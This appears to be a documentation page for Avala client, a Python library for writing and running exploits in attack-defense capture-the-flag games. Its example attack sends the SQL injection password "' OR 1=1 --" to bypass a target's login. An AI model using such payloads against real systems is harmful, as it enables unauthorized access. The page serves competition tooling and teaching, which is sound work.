---
hide:
- toc
---

# Avala client overview

Each player on the team should have **Avala client** installed on their own machine. Avala client is shipped as a Python library and handles the following:

- Provides a lightweight intuitive interface for writing exploits.
- Executes attacks in parallel in sync with the game ticks.
- Automatically extracts and sends flags for submission.

---

When developing exploits with Avala, you can focus just on the core logic of the attack. Avala will handle all the surrounding tasks, such as obtaining target IPs, fetching corresponding flag IDs, keeping attacks in sync with the game tick, and extracting flags from strings.

The following example shows a simple login bypass using a username provided in a flag ID (e.g. `"{\"username\": \"johndoe\"}"`). After successful login, the flag will be *somewhere* in the response.

```py
from avala import exploit
import json
import requests


@exploit(service="foobar")
def attack(target: str, flag_ids: str):
    username = json.loads(flag_ids)["username"]

    payload = {
        "username": username
        "password": "' OR 1=1 --"
    }

    response = requests.post(f"http://{target}:5000/login", json=payload)
    return response.text
```

---

To get started, first you will need to prepare your workspace and install Avala library. 🚀
